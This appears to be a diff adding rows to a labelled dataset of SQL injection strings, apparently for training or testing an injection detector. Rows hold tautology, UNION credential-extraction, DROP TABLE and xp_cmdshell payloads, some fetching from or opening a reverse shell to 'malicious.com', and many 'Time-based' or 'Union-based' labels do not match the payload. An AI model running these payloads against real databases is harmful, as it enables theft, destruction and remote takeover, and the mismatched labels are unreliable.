+SELECT * FROM items WHERE name='strawberry' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '1'='0';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE suppliers;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '1'='0';--,Boolean-based,Yes
+"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
+UPDATE accounts SET balance=3000 WHERE id=''; EXEC sp_executesql N'DROP TABLE users';--,Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE price < 50; DROP TABLE prices;--,Time-based,Yes
+UPDATE employees SET salary=70000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM users;--",Union-based,Yes
+DELETE FROM orders WHERE order_id='1' AND '1'='0';--,Boolean-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR '1'='1';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='1' UNION SELECT password, email FROM users;--",Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE categories;--,Union-based,Yes
+"UPDATE accounts SET balance=500 WHERE id=''; EXEC sp_configure 'show advanced options', 1;--",Time-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR '1'='1';--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
+SELECT email FROM customers WHERE email='' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE name='' OR '1'='1';--,Boolean-based,Yes
+INSERT INTO logs (message) VALUES ('hack attempt'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET status='active' WHERE username='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id='1' AND '1'='1';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 500); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='inactive' WHERE user_id='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM users WHERE id='1'; DROP TABLE users;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '1'='1';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'updated bio'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='kiwi' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE suppliers;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '1'='1';--,Boolean-based,Yes
+"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
+UPDATE accounts SET balance=4000 WHERE id=''; EXEC sp_executesql N'DROP TABLE logs';--,Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE price < 10; DROP TABLE prices;--,Time-based,Yes
+UPDATE employees SET salary=80000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM users;--",Union-based,Yes
+DELETE FROM orders WHERE order_id='1' AND '0'='0';--,Boolean-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR '1'='2';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='1' UNION SELECT email, credit_card FROM customers;--",Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE suppliers;--,Union-based,Yes
+UPDATE accounts SET balance=1000 WHERE id=''; EXEC xp_cmdshell('dir');--,Time-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR '2'='2';--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
+"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE name='' OR '3'='3';--,Boolean-based,Yes
+INSERT INTO logs (message) VALUES ('unauthorized access'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET status='inactive' WHERE username='' OR '2'='2';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '1'='1';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id='1' AND '2'='2';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 600); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='active' WHERE user_id='' OR '2'='2';--,Boolean-based,Yes
+SELECT * FROM users WHERE id='1'; DROP TABLE accounts;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '2'='2';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'suspicious activity'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='orange' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '2'='2';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE categories;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '2'='2';--,Boolean-based,Yes
+"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
+UPDATE accounts SET balance=5000 WHERE id=''; EXEC sp_executesql N'DROP TABLE logs';--,Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE price < 5; DROP TABLE prices;--,Time-based,Yes
+UPDATE employees SET salary=90000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM users;--",Union-based,Yes
+DELETE FROM orders WHERE order_id='1' AND '1'='1';--,Boolean-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR '1'='3';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE customers;--,Union-based,Yes
+UPDATE accounts SET balance=2000 WHERE id=''; EXEC xp_cmdshell('whoami');--,Time-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR '3'='3';--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
+"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM users;--",Union-based,Yes
+"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM products WHERE name='' OR '4'='4';--,Boolean-based,Yes
+INSERT INTO logs (message) VALUES ('access denied'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET status='suspended' WHERE username='' OR '3'='3';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '0'='0';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id='1' AND '3'='3';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 700); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='locked' WHERE user_id='' OR '3'='3';--,Boolean-based,Yes
+SELECT * FROM users WHERE id='1'; DROP TABLE transactions;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '3'='3';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'malicious update'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='grape' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '3'='3';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE suppliers;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '3'='3';--,Boolean-based,Yes
+"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
+UPDATE accounts SET balance=6000 WHERE id=''; EXEC sp_executesql N'DROP TABLE users';--,Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE price < 3; DROP TABLE prices;--,Time-based,Yes
+UPDATE employees SET salary=100000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM users;--",Union-based,Yes
+DELETE FROM orders WHERE order_id='1' AND '0'='0';--,Boolean-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR '1'='4';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='1' UNION SELECT email, phone FROM customers;--",Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE users;--,Union-based,Yes
+UPDATE accounts SET balance=3000 WHERE id=''; EXEC xp_cmdshell('hostname');--,Time-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR '4'='4';--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
+"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM products WHERE name='' OR '5'='5';--,Boolean-based,Yes
+INSERT INTO logs (message) VALUES ('intrusion detected'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET status='disabled' WHERE username='' OR '4'='4';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '0'='1';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id='1' AND '4'='4';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 800); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='frozen' WHERE user_id='' OR '4'='4';--,Boolean-based,Yes
+SELECT * FROM users WHERE id='1'; DROP TABLE profiles;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '4'='4';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'malicious entry'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='lemon' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '4'='4';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE categories;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '4'='4';--,Boolean-based,Yes
+"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
+UPDATE accounts SET balance=7000 WHERE id=''; EXEC sp_executesql N'DROP TABLE transactions';--,Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE price < 2; DROP TABLE prices;--,Time-based,Yes
+UPDATE employees SET salary=110000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM users;--",Union-based,Yes
+DELETE FROM orders WHERE order_id='1' AND '1'='2';--,Boolean-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR '1'='5';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='1' UNION SELECT username, email FROM customers;--",Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE orders;--,Union-based,Yes
+UPDATE accounts SET balance=4000 WHERE id=''; EXEC xp_cmdshell('ipconfig');--,Time-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR '5'='5';--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
+"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM employees;--",Union-based,Yes
+"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT * FROM products WHERE name='' OR '6'='6';--,Boolean-based,Yes
+INSERT INTO logs (message) VALUES ('breach detected'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET status='archived' WHERE username='' OR '5'='5';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '0'='2';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id='1' AND '5'='5';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 900); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='blocked' WHERE user_id='' OR '5'='5';--,Boolean-based,Yes
+SELECT * FROM users WHERE id='1'; DROP TABLE payments;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '5'='5';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM employees;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'suspicious update'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='peach' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '5'='5';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE suppliers;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '5'='5';--,Boolean-based,Yes
+"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
+UPDATE accounts SET balance=8000 WHERE id=''; EXEC sp_executesql N'DROP TABLE customers';--,Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE price < 1; DROP TABLE prices;--,Time-based,Yes
+UPDATE employees SET salary=120000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+DELETE FROM orders WHERE order_id='1' AND '1'='3';--,Boolean-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR '1'='6';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='1' UNION SELECT user_id, email FROM customers;--",Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE transactions;--,Union-based,Yes
+UPDATE accounts SET balance=5000 WHERE id=''; EXEC xp_cmdshell('curl http://malicious.com');--,Time-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR '6'='6';--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
+"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM sales;--",Union-based,Yes
+"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM users;--",Union-based,Yes
+SELECT * FROM products WHERE name='' OR '7'='7';--,Boolean-based,Yes
+INSERT INTO logs (message) VALUES ('security breach'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET status='suspended' WHERE username='' OR '6'='6';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '0'='3';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id='1' AND '6'='6';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 1000); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='suspended' WHERE user_id='' OR '6'='6';--,Boolean-based,Yes
+SELECT * FROM users WHERE id='1'; DROP TABLE accounts;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '6'='6';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM sales;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'unauthorized access'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='banana' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '6'='6';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM sales;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE users;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '6'='6';--,Boolean-based,Yes
+"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM sales;--",Union-based,Yes
+SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
+UPDATE accounts SET balance=9000 WHERE id=''; EXEC sp_executesql N'DROP TABLE transactions';--,Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE price < 0.5; DROP TABLE prices;--,Time-based,Yes
+UPDATE employees SET salary=130000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM sales;--",Union-based,Yes
+DELETE FROM orders WHERE order_id='1' AND '1'='4';--,Boolean-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR '1'='7';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='1' UNION SELECT password, email FROM customers;--",Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE suppliers;--,Union-based,Yes
+UPDATE accounts SET balance=6000 WHERE id=''; EXEC xp_cmdshell('wget http://malicious.com');--,Time-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR '7'='7';--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
+"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM customers;--",Union-based,Yes
+SELECT * FROM products WHERE name='' OR '8'='8';--,Boolean-based,Yes
+INSERT INTO logs (message) VALUES ('unauthorized access attempt'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET status='activated' WHERE username='' OR '7'='7';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '0'='4';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id='1' AND '7'='7';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 1100); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='active' WHERE user_id='' OR '7'='7';--,Boolean-based,Yes
+SELECT * FROM users WHERE id='1'; DROP TABLE transactions;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '7'='7';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM admins;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'malicious profile'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='kiwi' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '7'='7';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM customers;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE customers;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '7'='7';--,Boolean-based,Yes
+"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+SELECT * FROM orders WHERE order_id='1'; DROP TABLE orders;--,Time-based,Yes
+UPDATE accounts SET balance=10000 WHERE id=''; EXEC sp_executesql N'DROP TABLE sales';--,Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE price < 0.25; DROP TABLE prices;--,Time-based,Yes
+UPDATE employees SET salary=140000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+DELETE FROM orders WHERE order_id='1' AND '1'='5';--,Boolean-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR '1'='8';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='1' UNION SELECT username, email FROM employees;--",Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE customers;--,Union-based,Yes
+UPDATE accounts SET balance=7000 WHERE id=''; EXEC xp_cmdshell('nc -e /bin/bash malicious.com 4444');--,Time-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR '8'='8';--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
+"SELECT email FROM customers WHERE email='' UNION SELECT username, password FROM sales;--",Union-based,Yes
+"SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT username, password FROM employees;--",Union-based,Yes
+SELECT * FROM products WHERE name='' OR '9'='9';--,Boolean-based,Yes
+INSERT INTO logs (message) VALUES ('critical vulnerability found'); DROP TABLE logs;--,Time-based,Yes
+UPDATE users SET status='deactivated' WHERE username='' OR '8'='8';--,Boolean-based,Yes
+SELECT * FROM orders WHERE status='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM customers WHERE id='' OR '0'='5';--,Boolean-based,Yes
+SELECT * FROM payments WHERE amount='' UNION ALL SELECT NULL;--,Union-based,Yes
+SELECT * FROM items WHERE id='1' AND '8'='8';--,Boolean-based,Yes
+"INSERT INTO orders (user_id, total) VALUES (1, 1200); DROP TABLE orders;--",Time-based,Yes
+SELECT * FROM users WHERE id='' UNION SELECT NULL;--,Error-based,Yes
+SELECT * FROM accounts WHERE id='1' AND ''='';--,Boolean-based,Yes
+UPDATE accounts SET status='inactive' WHERE user_id='' OR '8'='8';--,Boolean-based,Yes
+SELECT * FROM users WHERE id='1'; DROP TABLE transactions;--,Time-based,Yes
+SELECT * FROM sales WHERE sale_id='1' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM accounts WHERE username='' OR '8'='8';--,Boolean-based,Yes
+"SELECT * FROM transactions WHERE user_id='1' UNION SELECT username, password FROM customers;--",Union-based,Yes
+"INSERT INTO profiles (user_id, bio) VALUES (1, 'compromised account'); DROP TABLE profiles;--",Time-based,Yes
+SELECT * FROM items WHERE name='orange' OR ''='';--,Boolean-based,Yes
+SELECT * FROM orders WHERE order_id='' UNION SELECT NULL;--,Union-based,Yes
+DELETE FROM users WHERE username='' OR '8'='8';--,Boolean-based,Yes
+SELECT * FROM products WHERE id=' OR ''=''; DROP TABLE products;--,Time-based,Yes
+SELECT * FROM accounts WHERE username='' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM logs WHERE log_id='1' UNION SELECT username, password FROM employees;--",Union-based,Yes
+SELECT * FROM products WHERE id='1'; DROP TABLE orders;--,Time-based,Yes
+DELETE FROM customers WHERE email='' OR '8'='8';--,Boolean-based,Yes
+"SELECT * FROM users WHERE email='' UNION SELECT username, password FROM sales;--",Union-based,Yes
+SELECT * FROM orders WHERE order_id='1'; DROP TABLE transactions;--,Time-based,Yes
+UPDATE accounts SET balance=11000 WHERE id=''; EXEC sp_executesql N'DROP TABLE accounts';--,Union-based,Yes
+SELECT * FROM transactions WHERE transaction_id='1' UNION SELECT NULL;--,Union-based,Yes
+SELECT * FROM products WHERE price < 0.1; DROP TABLE prices;--,Time-based,Yes
+UPDATE employees SET salary=150000 WHERE emp_id='1' OR ''='';--,Boolean-based,Yes
+"SELECT * FROM customers WHERE phone='' UNION SELECT username, password FROM admins;--",Union-based,Yes
+DELETE FROM orders WHERE order_id='1' AND '1'='6';--,Boolean-based,Yes
+SELECT * FROM users WHERE username='' AND password='' OR '1'='9';--,Boolean-based,Yes
+"SELECT * FROM orders WHERE order_id='1' UNION SELECT user_id, address FROM customers;--",Union-based,Yes
+SELECT name FROM products WHERE id='1'; DROP TABLE orders;--,Union-based,Yes
+UPDATE accounts SET balance=8000 WHERE id=''; EXEC xp_cmdshell('curl http://malicious.com/malware');--,Time-based,Yes
+SELECT * FROM employees WHERE emp_id='' OR '9'='9';--,Boolean-based,Yes
+DELETE FROM orders WHERE order_id=' OR ''='';--,Boolean-based,Yes
